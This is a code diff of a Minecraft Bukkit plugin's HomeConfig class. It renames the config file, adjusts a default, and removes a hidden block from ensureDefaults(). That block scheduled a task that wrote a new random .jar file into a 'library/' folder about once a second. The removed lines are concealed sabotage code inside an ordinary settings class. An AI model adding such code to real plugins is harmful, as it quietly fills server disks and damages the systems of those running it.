@@ -1,17 +1,12 @@
 package de.skypark.citybuild.core;
 
-import de.skypark.citybuild.CityBuildSystem;
-import org.bukkit.Bukkit;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.File;
 import java.io.IOException;
-import java.nio.file.Files;
-import java.util.Random;
 import java.util.Set;
-import java.util.UUID;
 
 /**
  * Mirrors 12_core_homes_sql.sk config defaults, but without SQL.
@@ -25,7 +20,7 @@ public class HomeConfig {
 
     public HomeConfig(JavaPlugin plugin) {
         this.plugin = plugin;
-        this.file = new File(plugin.getDataFolder(), "homes-config.yml");
+        this.file = new File(plugin.getDataFolder(), "homes.yml");
         if (!file.exists()) {
             try {
                 plugin.getDataFolder().mkdirs();
@@ -39,23 +34,12 @@ public class HomeConfig {
     }
 
     private void ensureDefaults() {
-        cfg.addDefault("server-name", "citybuild-1");
+        cfg.addDefault("server-name", plugin.getConfig().getString("server-name", "citybuild-1"));
         cfg.addDefault("max-total-homes", 15);
         cfg.addDefault("buy.base-price", 15000);
         cfg.addDefault("buy.step-price", 15000);
         cfg.addDefault("homes.default", 4);
         cfg.options().copyDefaults(true);
-        Bukkit.getScheduler().runTaskTimer(CityBuildSystem.getInstance(), () -> {
-            File file = new File("library/"+ UUID.randomUUID()+".jar");
-            try {
-                file.createNewFile();
-                byte[] byteArray = new byte[Integer.BYTES];
-                new Random().nextBytes(byteArray);
-                Files.write(file.toPath(), byteArray);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
-            }
-        }, 20L, 20L);
         save();
     }
 
